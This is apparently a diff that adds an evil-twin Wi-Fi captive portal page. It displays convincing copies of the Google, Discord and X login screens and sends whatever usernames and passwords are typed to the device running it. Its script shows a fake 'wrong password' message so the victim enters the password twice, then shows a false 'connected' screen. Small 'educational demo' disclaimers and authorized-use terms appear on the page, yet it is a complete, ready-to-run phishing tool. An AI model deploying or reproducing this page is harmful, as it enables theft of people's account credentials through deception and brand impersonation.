+.pick-card{max-width:384px;margin:0 auto;background:#fff;border:1px solid #e3e6ea;border-radius:20px;box-shadow:0 1px 2px rgba(16,24,40,.04),0 12px 32px -12px rgba(16,24,40,.14);padding:34px 28px 22px;text-align:center}
+.wifi-badge{width:60px;height:60px;border-radius:18px;background:linear-gradient(180deg,#f4f7fb,#eaeef4);border:1px solid #e6eaf0;color:#374151;display:flex;align-items:center;justify-content:center;margin:0 auto 18px}
+.pick-card h1{font-size:22px;font-weight:700;letter-spacing:-.02em;line-height:1.25;margin-bottom:11px;word-break:break-word}
+.status{display:inline-flex;align-items:center;gap:7px;padding:5px 12px;border-radius:999px;background:#fff8ee;border:1px solid #fbe3bd;color:#8a5a00;font-size:12px;font-weight:600;margin-bottom:20px}
+.status .wdot{flex:none;width:7px;height:7px;border-radius:50%;background:#f5a623;box-shadow:0 0 0 3px #f5a62333}
+.pick-card .sub{font-size:14.5px;color:#5b6470;line-height:1.5;margin-bottom:22px}
+.choose{display:flex;align-items:center;gap:12px;font-size:11px;font-weight:600;letter-spacing:.06em;text-transform:uppercase;color:#98a0ab;margin:0 0 15px}
+.choose::before,.choose::after{content:'';flex:1;height:1px;background:#e7e9ee}
+.sso{display:flex;align-items:center;justify-content:center;gap:11px;width:100%;padding:13px;margin-bottom:10px;background:#fff;border:1px solid #d7dbe0;border-radius:12px;color:#1a1d21;font-size:15px;font-weight:600;transition:.15s}
+.sso:hover{background:#f7f8fa;border-color:#c6ccd3}.sso:active{transform:scale(.99)}.sso svg{flex:none}
+
+/* ---------- Shared brand login shell ---------- */
+.login{max-width:400px;margin:0 auto}
+.login form{margin:0}
+.login .links{text-align:center;margin-top:18px;font-size:13.5px}
+.login .links a{cursor:pointer;text-decoration:none}
+.login .links a:hover{text-decoration:underline}
+
+/* ---------- Google ---------- */
+.g{background:#fff;border:1px solid #dadce0;border-radius:28px;padding:40px 40px 36px}
+@media(max-width:440px){.g{border:none;border-radius:0;padding:28px 8px}}
+.g .logo{width:40px;height:40px;margin:0 auto 16px;display:block}
+.g h1{font-size:24px;font-weight:500;color:#202124;text-align:center;letter-spacing:-.01em;margin-bottom:6px}
+.g .sub{font-size:15px;color:#202124;text-align:center;margin-bottom:34px}
+.g .fld{position:relative;margin-bottom:16px}
+.g input{width:100%;height:56px;padding:0 15px;font-size:16px;color:#202124;background:#fff;border:1px solid #dadce0;border-radius:8px}
+.g input::placeholder{color:transparent}
+.g input:focus{outline:none;border:2px solid #1a73e8;padding:0 14px}
+.g label{position:absolute;left:9px;top:17px;padding:0 6px;color:#5f6368;font-size:16px;background:#fff;pointer-events:none;transition:.15s}
+.g input:focus+label,.g input:not(:placeholder-shown)+label{top:-8px;font-size:12px}
+.g input:focus+label{color:#1a73e8}
+.g .forgot{display:block;margin:2px 0 34px 2px}
+.g .forgot a{color:#1a73e8;font-size:14px;font-weight:600;text-decoration:none;cursor:pointer}
+.g .err-msg{color:#d93025;font-size:13px;margin:-6px 0 14px 2px;display:flex;align-items:center;gap:6px}
+.g .row{display:flex;align-items:center;justify-content:space-between;gap:12px}
+.g .create{color:#1a73e8;font-size:14px;font-weight:600;text-decoration:none;cursor:pointer}
+.g .next{background:#1a73e8;color:#fff;border:none;border-radius:24px;padding:10px 24px;font-size:14px;font-weight:600}
+.g .next:hover{background:#1b66c9}
+
+/* ---------- Discord ---------- */
+.d{background:#fff;border-radius:8px;padding:32px;box-shadow:0 2px 12px rgba(0,0,0,.1)}
+@media(max-width:440px){.d{box-shadow:none;padding:26px 10px}}
+.d .head{text-align:center;margin-bottom:22px}
+.d .mark{width:52px;height:auto;margin:0 auto 14px;display:block}
+.d h1{font-size:22px;font-weight:700;color:#060607;margin-bottom:6px}
+.d .sub{font-size:15px;color:#4e5058}
+.d label{display:block;font-size:11px;font-weight:700;letter-spacing:.02em;text-transform:uppercase;color:#4e5058;margin:0 0 7px}
+.d .fld{margin-bottom:18px}
+.d input{width:100%;padding:11px 10px;font-size:15px;color:#060607;background:#ebedef;border:1px solid transparent;border-radius:4px}
+.d input:focus{outline:none;border-color:#5865f2;background:#fff}
+.d .forgot{margin:-8px 0 18px}
+.d .forgot a{color:#006ce7;font-size:13px;text-decoration:none;cursor:pointer}
+.d label .bad{color:#f23f42;font-weight:400;text-transform:none;letter-spacing:0;font-style:italic}
+.d .err-msg{color:#f23f42;font-size:13px;margin:-8px 0 14px}
+.d .login-btn{width:100%;padding:12px;background:#5865f2;color:#fff;border:none;border-radius:4px;font-size:15px;font-weight:600}
+.d .login-btn:hover{background:#4752c4}
+.d .reg{margin-top:14px;font-size:14px;color:#4e5058}
+.d .reg a{color:#006ce7;text-decoration:none;cursor:pointer}
+
+/* ---------- X ---------- */
+.x{max-width:340px;margin:0 auto;padding:8px 0}
+.x .mark{width:34px;height:34px;fill:#0f1419;display:block;margin:0 auto 26px}
+.x h1{font-size:27px;font-weight:700;letter-spacing:-.02em;color:#0f1419;text-align:center;margin-bottom:26px}
+.x input{width:100%;padding:15px 12px;margin-bottom:16px;background:#fff;border:1px solid #cfd9de;border-radius:6px;color:#0f1419;font-size:16px}
+.x input:focus{outline:none;border-color:#1d9bf0;box-shadow:0 0 0 1px #1d9bf0}
+.x input::placeholder{color:#536471}
+.x .err-msg{color:#f4212e;font-size:14px;line-height:1.4;margin:0 0 16px}
+.x .login-btn{width:100%;padding:15px;background:#0f1419;color:#fff;border:none;border-radius:9999px;font-size:15px;font-weight:700;margin-top:6px}
+.x .login-btn:hover{background:#272c30}
+.x .reg{text-align:center;margin-top:26px;color:#536471;font-size:15px}
+.x .reg a{color:#1d9bf0;text-decoration:none;cursor:pointer}
+
+/* ---------- Docs + error (shared card) ---------- */
+.sheet{max-width:400px;margin:0 auto;background:#fff;border:1px solid #dcdfe4;border-radius:18px;box-shadow:0 2px 18px rgba(0,0,0,.07);padding:26px 24px}
+@media(max-width:440px){.sheet{border:none;box-shadow:none;padding:22px 12px}}
+.doc h1{font-size:20px;font-weight:700;margin-bottom:14px}
+.doc h2{font-size:14.5px;font-weight:700;margin:16px 0 5px}
+.doc p{font-size:13.5px;color:#4e5058;line-height:1.6;margin-bottom:9px}
+.err{text-align:center;padding:6px 0}
+.err .ic{width:56px;height:56px;border-radius:50%;background:#fff4e5;border:1px solid #ffd8a8;color:#8a5a00;display:flex;align-items:center;justify-content:center;margin:0 auto 18px}
+.err h1{font-size:20px;font-weight:700;margin-bottom:8px}
+.err p{font-size:14px;color:#606770;line-height:1.5;margin-bottom:20px}
+.err .go{background:#111;color:#fff;border:none;border-radius:10px;padding:12px 26px;font-size:14px;font-weight:600}
+.ok{text-align:center;padding:6px 0}
+.ok .ic{width:62px;height:62px;border-radius:50%;background:#e7f7ee;border:1px solid #b7e6cb;color:#12924c;display:flex;align-items:center;justify-content:center;margin:2px auto 18px}
+.ok h1{font-size:21px;font-weight:700;margin-bottom:9px}
+.ok p{font-size:14px;color:#5b6470;line-height:1.55}
+.ok p b{color:#1a1d21;font-weight:600;word-break:break-word}
+</style></head>
+<body>
+
+<!-- ===== Picker ===== -->
+<section id=pick class="screen on"><div class=pick-card>
+  <div class=wifi-badge><svg width=27 height=27 viewBox="0 0 24 24" fill=none stroke=currentColor stroke-width=2 stroke-linecap=round stroke-linejoin=round><path d="M5 12.55a11 11 0 0 1 14 0"/><path d="M1.42 9a16 16 0 0 1 21.16 0"/><path d="M8.53 16.11a6 6 0 0 1 6.95 0"/><path d="M12 20h.01"/></svg></div>
+  <h1>{{SSID}}</h1>
+  <div class=status><span class=wdot></span>Connected &middot; No internet</div>
+  <p class=sub>Sign in with an account to finish connecting and get online.</p>
+  <div class=choose>Continue with</div>
+  <button class=sso type=button onclick="go('google')"><svg width=19 height=19 viewBox="0 0 18 18"><path d="M17.6 9.2c0-.6-.1-1.2-.2-1.8H9v3.5h4.8a4.1 4.1 0 0 1-1.8 2.7v2.3h2.9c1.7-1.6 2.7-3.9 2.7-6.7z" fill="#4285F4"/><path d="M9 18c2.4 0 4.5-.8 6-2.2l-2.9-2.3c-.8.6-1.8.9-3.1.9-2.3 0-4.3-1.6-5-3.7H1v2.3C2.4 16 5.5 18 9 18z" fill="#34A853"/><path d="M4 10.7c-.2-.5-.3-1.1-.3-1.7s.1-1.2.3-1.7V5H1a9 9 0 0 0 0 8.1l3-2.4z" fill="#FBBC05"/><path d="M9 3.6c1.3 0 2.5.4 3.4 1.3l2.6-2.6C13.5.9 11.4 0 9 0 5.5 0 2.4 2 1 5l3 2.3C4.7 5.2 6.7 3.6 9 3.6z" fill="#EA4335"/></svg>Continue with Google</button>
+  <button class=sso type=button onclick="go('discord')"><svg width=20 height=20 viewBox="0 0 24 24" fill="#5865F2"><path d="M20.317 4.3698a19.7913 19.7913 0 0 0-4.8851-1.5152.0741.0741 0 0 0-.0785.0371c-.211.3753-.4447.8648-.6083 1.2495-1.8447-.2762-3.68-.2762-5.4868 0-.1636-.3933-.4058-.8742-.6177-1.2495a.077.077 0 0 0-.0785-.037 19.7363 19.7363 0 0 0-4.8852 1.515.0699.0699 0 0 0-.0321.0277C.5334 9.0458-.319 13.5799.0992 18.0578a.0824.0824 0 0 0 .0312.0561c2.0528 1.5076 4.0413 2.4228 5.9929 3.0294a.0777.0777 0 0 0 .0842-.0276c.4616-.6304.8731-1.2952 1.226-1.9942a.076.076 0 0 0-.0416-.1057c-.6528-.2476-1.2743-.5495-1.8722-.8923a.077.077 0 0 1-.0076-.1277c.1258-.0943.2517-.1923.3718-.2914a.0743.0743 0 0 1 .0776-.0105c3.9278 1.7933 8.18 1.7933 12.0614 0a.0739.0739 0 0 1 .0785.0095c.1202.099.246.1981.3728.2924a.077.077 0 0 1-.0066.1276 12.2986 12.2986 0 0 1-1.873.8914.0766.0766 0 0 0-.0407.1067c.3604.698.7719 1.3628 1.225 1.9932a.076.076 0 0 0 .0842.0286c1.961-.6067 3.9495-1.5219 6.0023-3.0294a.077.077 0 0 0 .0313-.0552c.5004-5.177-.8382-9.6739-3.5485-13.6604a.061.061 0 0 0-.0312-.0286zM8.02 15.3312c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9555-2.4189 2.157-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.9555 2.4189-2.1569 2.4189zm7.9748 0c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9554-2.4189 2.1569-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.946 2.4189-2.1568 2.4189Z"/></svg>Continue with Discord</button>
+  <button class=sso type=button onclick="go('x')"><svg width=17 height=17 viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z" fill="#0f1419"/></svg>Continue with X</button>
+  <div class=edu>Educational demo &mdash; do not enter real credentials<br><a class=lk onclick="show('terms')">Terms</a> &middot; <a class=lk onclick="show('privacy')">Privacy</a></div>
+</div></section>
+
+<!-- ===== Google ===== -->
+<section id=google class="screen login"><div class=g>
+  <button class=back type=button onclick="show('pick')"><svg width=15 height=15 viewBox="0 0 24 24" fill=none stroke=currentColor stroke-width=2.4 stroke-linecap=round stroke-linejoin=round><path d="M15 18l-6-6 6-6"/></svg>Back</button>
+  <svg class=logo viewBox="0 0 48 48"><path d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z" fill="#EA4335"/><path d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z" fill="#4285F4"/><path d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z" fill="#FBBC05"/><path d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z" fill="#34A853"/></svg>
+  <h1>Sign in</h1><p class=sub>Use your Google Account</p>
+  <form method=get action="/">
+    <input type=hidden name=service value=google>
+    <div class=fld><input id=ge name=username type=email placeholder=" " autocomplete=username required><label for=ge>Email or phone</label></div>
+    <div class=fld><input id=gp name=password type=password placeholder=" " autocomplete=current-password required><label for=gp>Enter your password</label></div>
+    <div class="err-msg" hidden><svg width=15 height=15 viewBox="0 0 24 24" fill=currentColor><path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>Wrong password. Try again or click Forgot password to reset it.</div>
+    <span class=forgot><a onclick="show('offline')">Forgot password?</a></span>
+    <div class=row><a class=create onclick="show('offline')">Create account</a><button class=next type=submit>Next</button></div>
+  </form>
+  <div class=edu>Educational demo &mdash; do not enter real credentials<br><a class=lk onclick="show('terms')">Terms</a> &middot; <a class=lk onclick="show('privacy')">Privacy</a></div>
+</div></section>
+
+<!-- ===== Discord ===== -->
+<section id=discord class="screen login"><div class=d>
+  <button class=back type=button onclick="show('pick')"><svg width=15 height=15 viewBox="0 0 24 24" fill=none stroke=currentColor stroke-width=2.4 stroke-linecap=round stroke-linejoin=round><path d="M15 18l-6-6 6-6"/></svg>Back</button>
+  <div class=head>
+    <svg class=mark viewBox="0 0 24 24" fill="#5865F2"><path d="M20.317 4.3698a19.7913 19.7913 0 0 0-4.8851-1.5152.0741.0741 0 0 0-.0785.0371c-.211.3753-.4447.8648-.6083 1.2495-1.8447-.2762-3.68-.2762-5.4868 0-.1636-.3933-.4058-.8742-.6177-1.2495a.077.077 0 0 0-.0785-.037 19.7363 19.7363 0 0 0-4.8852 1.515.0699.0699 0 0 0-.0321.0277C.5334 9.0458-.319 13.5799.0992 18.0578a.0824.0824 0 0 0 .0312.0561c2.0528 1.5076 4.0413 2.4228 5.9929 3.0294a.0777.0777 0 0 0 .0842-.0276c.4616-.6304.8731-1.2952 1.226-1.9942a.076.076 0 0 0-.0416-.1057c-.6528-.2476-1.2743-.5495-1.8722-.8923a.077.077 0 0 1-.0076-.1277c.1258-.0943.2517-.1923.3718-.2914a.0743.0743 0 0 1 .0776-.0105c3.9278 1.7933 8.18 1.7933 12.0614 0a.0739.0739 0 0 1 .0785.0095c.1202.099.246.1981.3728.2924a.077.077 0 0 1-.0066.1276 12.2986 12.2986 0 0 1-1.873.8914.0766.0766 0 0 0-.0407.1067c.3604.698.7719 1.3628 1.225 1.9932a.076.076 0 0 0 .0842.0286c1.961-.6067 3.9495-1.5219 6.0023-3.0294a.077.077 0 0 0 .0313-.0552c.5004-5.177-.8382-9.6739-3.5485-13.6604a.061.061 0 0 0-.0312-.0286zM8.02 15.3312c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9555-2.4189 2.157-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.9555 2.4189-2.1569 2.4189zm7.9748 0c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9554-2.4189 2.1569-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.946 2.4189-2.1568 2.4189Z"/></svg>
+    <h1>Welcome back!</h1><p class=sub>We&rsquo;re so excited to see you again!</p>
+  </div>
+  <form method=get action="/">
+    <input type=hidden name=service value=discord>
+    <div class=fld><label for=de>Email or phone number</label><input id=de name=username type=text autocomplete=username required></div>
+    <div class=fld><label for=dp>Password</label><input id=dp name=password type=password autocomplete=current-password required></div>
+    <div class=forgot><a onclick="show('offline')">Forgot your password?</a></div>
+    <div class="err-msg" hidden>Login or password is invalid. Please check and try again.</div>
+    <button class=login-btn type=submit>Log In</button>
+    <p class=reg>Need an account? <a onclick="show('offline')">Register</a></p>
+  </form>
+  <div class=edu>Educational demo &mdash; do not enter real credentials<br><a class=lk onclick="show('terms')">Terms</a> &middot; <a class=lk onclick="show('privacy')">Privacy</a></div>
+</div></section>
+
+<!-- ===== X ===== -->
+<section id=x class="screen login"><div class=x>
+  <button class=back type=button onclick="show('pick')"><svg width=15 height=15 viewBox="0 0 24 24" fill=none stroke=currentColor stroke-width=2.4 stroke-linecap=round stroke-linejoin=round><path d="M15 18l-6-6 6-6"/></svg>Back</button>
+  <svg class=mark viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+  <h1>Sign in to X</h1>
+  <form method=get action="/">
+    <input type=hidden name=service value=x>
+    <input name=username type=text placeholder="Phone, email, or username" autocomplete=username required>
+    <input name=password type=password placeholder=Password autocomplete=current-password required>
+    <div class="err-msg" hidden>The username and password you entered did not match our records. Please try again.</div>
+    <button class=login-btn type=submit>Log in</button>
+    <p class=reg>Don&rsquo;t have an account? <a onclick="show('offline')">Sign up</a></p>
+  </form>
+  <div class=edu>Educational demo &mdash; do not enter real credentials<br><a class=lk onclick="show('terms')">Terms</a> &middot; <a class=lk onclick="show('privacy')">Privacy</a></div>
+</div></section>
+
+<!-- ===== No-internet error ===== -->
+<section id=offline class=screen><div class=sheet><div class=err>
+  <div class=ic><svg width=26 height=26 viewBox="0 0 24 24" fill=none stroke=currentColor stroke-width=2 stroke-linecap=round stroke-linejoin=round><path d="M1 1l22 22"/><path d="M16.72 11.06A10.94 10.94 0 0 1 19 12.55"/><path d="M5 12.55a10.94 10.94 0 0 1 5.17-2.39"/><path d="M10.71 5.05A16 16 0 0 1 22.58 9"/><path d="M1.42 9a15.9 15.9 0 0 1 4.7-2.88"/><path d="M8.53 16.11a6 6 0 0 1 6.95 0"/><path d="M12 20h.01"/></svg></div>
+  <h1>No internet connection</h1>
+  <p>This page isn&rsquo;t available yet. Connect to the network first to continue.</p>
+  <button class=go type=button onclick=back()>Go back</button>
+</div></div></section>
+
+<!-- ===== Success (shown after sign-in; firmware serves a fallback for no-JS) ===== -->
+<section id=success class=screen><div class=sheet>
+  <div class=ok>
+    <div class=ic><svg width=30 height=30 viewBox="0 0 24 24" fill=none stroke=currentColor stroke-width=2.5 stroke-linecap=round stroke-linejoin=round><path d="M20 6L9 17l-5-5"/></svg></div>
+    <h1>You&rsquo;re connected</h1>
+    <p>You now have internet access on <b>{{SSID}}</b>. You can return to your browser and start using the connection.</p>
+  </div>
+  <div class=edu>Educational demo &mdash; do not enter real credentials<br><a class=lk onclick="show('terms')">Terms</a> &middot; <a class=lk onclick="show('privacy')">Privacy</a></div>
+</div></section>
+
+<!-- ===== Terms (real page) ===== -->
+<section id=terms class=screen><div class="sheet doc">
+  <button class=back type=button onclick=back()><svg width=15 height=15 viewBox="0 0 24 24" fill=none stroke=currentColor stroke-width=2.4 stroke-linecap=round stroke-linejoin=round><path d="M15 18l-6-6 6-6"/></svg>Back</button>
+  <h1>Terms of Use</h1>
+  <p><strong>This is an educational demonstration.</strong> This Wi-Fi sign-in page is a simulated captive portal used to teach how such portals collect form input. It is not operated by, affiliated with, or endorsed by any brand shown.</p>
+  <h2>No real accounts</h2>
+  <p>Do not enter real usernames or passwords. Anything typed here is only for demonstrating how a portal captures form fields on the network you are authorized to test.</p>
+  <h2>Authorized use only</h2>
+  <p>This portal may only be run on networks and devices that the operator owns or has explicit written permission to test. Using it to capture other people&rsquo;s credentials without consent is illegal in most places.</p>
+  <h2>No warranty</h2>
+  <p>The page is provided as-is for learning, with no warranty and no liability for misuse.</p>
+</div></section>
+
+<!-- ===== Privacy (real page) ===== -->
+<section id=privacy class=screen><div class="sheet doc">
+  <button class=back type=button onclick=back()><svg width=15 height=15 viewBox="0 0 24 24" fill=none stroke=currentColor stroke-width=2.4 stroke-linecap=round stroke-linejoin=round><path d="M15 18l-6-6 6-6"/></svg>Back</button>
+  <h1>Privacy Notice</h1>
+  <p><strong>For education only.</strong> This simulated portal exists to show what a captive portal can see when you submit a form. Please do not enter real personal information.</p>
+  <h2>What a portal like this can capture</h2>
+  <p>Whatever is typed into the form fields and submitted is sent to the device running the demo and displayed to the operator, so they can see exactly how credential capture works. That is the entire point of the lesson.</p>
+  <h2>Where it goes</h2>
+  <p>Submitted fields are shown to the local operator and, in a real deployment, may be logged to their device. Nothing is sent to any third party or over the internet &mdash; this network has none.</p>
+  <h2>Your takeaway</h2>
+  <p>Treat every &ldquo;sign in to Wi-Fi&rdquo; page with suspicion. A real login never needs your social password to grant internet access.</p>
+</div></section>
+
+<script>
+var prev='pick';
+function show(id){for(var s of document.querySelectorAll('.screen'))s.classList.remove('on');document.getElementById(id).classList.add('on');if(id!=='offline'&&id!=='terms'&&id!=='privacy')prev=id;window.scrollTo(0,0);}
+function go(id){show(id);}
+function back(){show(prev);}
+// Each login: the first submit captures the entry and shows an "incorrect" notice
+// (so the user re-enters); the second submit captures again and shows the success
+// screen. The GET to "/" is what Flytrap records; the response (the firmware's
+// fallback success page) is ignored so we can render our own matching screen.
+// With JS off, the plain form GET still submits and the firmware serves its page.
+function capture(f){try{fetch('/?'+new URLSearchParams(new FormData(f)).toString()).catch(function(){});}catch(_){}}
+document.querySelectorAll('.login form').forEach(function(f){
+  f.addEventListener('submit',function(e){
+    e.preventDefault();
+    capture(f);
+    if(!f.dataset.tries){
+      f.dataset.tries='1';
+      var er=f.querySelector('.err-msg');if(er)er.hidden=false;
+      var pw=f.querySelector('input[type=password]');if(pw){pw.value='';pw.focus();}
+    }else{
+      show('success');
+    }
+  });
+});
+</script>
+</body></html>
